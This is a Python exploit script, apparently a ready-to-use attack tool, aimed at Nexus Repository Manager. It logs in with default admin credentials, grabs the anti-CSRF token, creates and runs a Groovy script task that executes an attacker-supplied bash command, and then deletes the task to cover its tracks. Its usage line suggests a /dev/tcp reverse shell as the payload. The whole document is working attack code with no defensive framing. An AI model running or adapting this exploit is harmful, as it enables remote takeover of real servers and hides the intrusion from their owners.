# -*- coding: utf-8 -*-
# Author: Ramoncjs
# @Time : 2020-04-29 18:24

import sys
import requests
import json


class expit(object):
    def __init__(self):
        # 请填写待执行命令
        self.exp = exp
        # 请填写待检测url
        self.url = url
        self.loginUrl = '%s/service/rapture/session' % (self.url)
        self.extdirectUrl = '%s/service/extdirect' % (self.url)
        self.antiTOKEN = '%s/static/rapture/extdirect-prod.js' % (self.url)
        self.headers1 = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0",
            "Accept": "*/*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip,deflate",
            "X-Nexus-UI": "true",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "close"}
        self.loginParams = {"username": "YWRtaW4=",
                            "password": "YWRtaW4xMjM="}
        self.createTaskParams = '''
        {"action":"coreui_Task","method":"create","data":[{"id":"NX.coreui.model.Task-1",
        "typeId":"script","enabled":true,"name":"test1","alertEmail":"","schedule":"manual",
        "properties":{"language":"groovy","source":"['/bin/bash','-c','%s'].execute()"},
        "recurringDays":[],"startDate":null}],"type":"rpc","tid":7}
        ''' % (self.exp)
        #填写burp代理地址方便实时监控状态
        self.proxies = {"http": "127.0.0.1:18080"}
        self.session = requests.session()
        self.loginSend()
        self.runTask()

    def loginSend(self):
        self.loginSession = self.session.post(url=self.loginUrl, headers=self.headers1, data=self.loginParams,
                                              verify=False, proxies=self.proxies)
        if self.loginSession.status_code == 204:
            print("[+] Login Success!", self.loginUrl, "admin/admin123")
            self.antiTOKEN = self.session.get(url="%s/static/rapture/bootstrap.js" % (self.url),
                                              headers=self.headers1, proxies=self.proxies)
            self.loginSession.statuscode = self.loginSession.status_code
            return True
        else:
            print("[-] Login Failed!", self.loginUrl, " Password was wrong and will not createTask and runTask!")
            self.loginSession.statuscode = self.loginSession.status_code
            return False

    def createTask(self):
        if self.loginSession.statuscode == 204:
            self.headers2 = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0",
                "Accept": "*/*",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip,deflate",
                "X-Nexus-UI": "true",
                "Content-Type": "application/json",
                "X-Requested-With": "XMLHttpRequest",
                "Connection": "close",
                "NX-ANTI-CSRF-TOKEN": "%s" % (self.session.cookies['NX-ANTI-CSRF-TOKEN'])
            }
            self.req_createTask = self.session.post(url=self.extdirectUrl, headers=self.headers2,
                                                    data=self.createTaskParams, verify=False, proxies=self.proxies)
            if json.loads(self.req_createTask.text)['result']['success'] == True:
                print("createTask Success was", json.loads(self.req_createTask.text)['result']['success'])
                return True
            else:
                print("createTask was false and will not runTask!")
                return False
        else:
            pass

    def runTask(self):
        if self.createTask() == True:
            self.runTaskParams = '''
            {"action":"coreui_Task","method":"run","data":["%s"],"type":"rpc","tid":7}
            ''' % (json.loads(self.req_createTask.text)['result']['data']['id'])
            self.req_runTask = self.session.post(url=self.extdirectUrl, headers=self.headers2,
                                                 data=self.runTaskParams, verify=False, proxies=self.proxies)
            print("runTask Success was", json.loads(self.req_runTask.text)['result']['success'])
            #运行之后清理新建计划任务
            self.deleteParams = '''
                   {"action":"coreui_Task","method":"remove","data":["%s"],"type":"rpc","tid":7}
                    ''' % (json.loads(self.req_createTask.text)['result']['data']['id'])
            self.req_deleteTask = self.session.post(url=self.extdirectUrl, headers=self.headers2,
                                                 data=self.deleteParams, verify=False, proxies=self.proxies)
            print("deleteTask Success was", json.loads(self.req_deleteTask.text)['result']['success'])

        else:
            pass



if __name__ == '__main__':
    print('\nUsages: pyhton3 http://www.test.com/8081 "/bin/bash -i >& /dev/tcp/IP/PORT 0>&1" #无回显\n')
    url = sys.argv[1]
    exp = sys.argv[2]
    test = expit()
